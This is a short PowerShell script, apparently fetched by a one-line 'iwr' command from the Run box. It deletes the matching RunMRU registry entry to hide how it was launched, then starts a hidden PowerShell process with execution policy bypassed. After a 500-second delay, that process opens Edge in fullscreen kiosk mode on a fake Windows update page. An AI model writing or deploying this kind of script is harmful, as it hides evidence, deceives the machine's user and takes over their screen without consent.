$Host.UI.RawUI.WindowTitle = $Host.UI.RawUI.WindowTitle

$kioskUrl = "https://fakeupdate.net/win10ue/"

function Clear-RunHistory {
    Start-Sleep -Milliseconds 100
    
    $runPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU'
    if (Test-Path $runPath) {
        $mruList = (Get-ItemProperty -Path $runPath).MRUList
        $entries = Get-ItemProperty -Path $runPath
        foreach ($key in $mruList.ToCharArray()) {
            $value = $entries.$key
            if ($value -match 'powershell.*iwr.*JoxCraft') {
                Remove-ItemProperty -Path $runPath -Name $key -ErrorAction SilentlyContinue
                break
            }
        }
    }
}

Clear-RunHistory

Start-Process -FilePath "powershell.exe" -WindowStyle Hidden -ArgumentList @(
    "-NoProfile",
    "-ExecutionPolicy", "Bypass",
    "-Command",
     "Start-Sleep -Seconds 500; Start-Process 'msedge.exe' '--kiosk https://fakeupdate.net/win10ue --edge-kiosk-type=fullscreen --no-first-run'"
)

exit
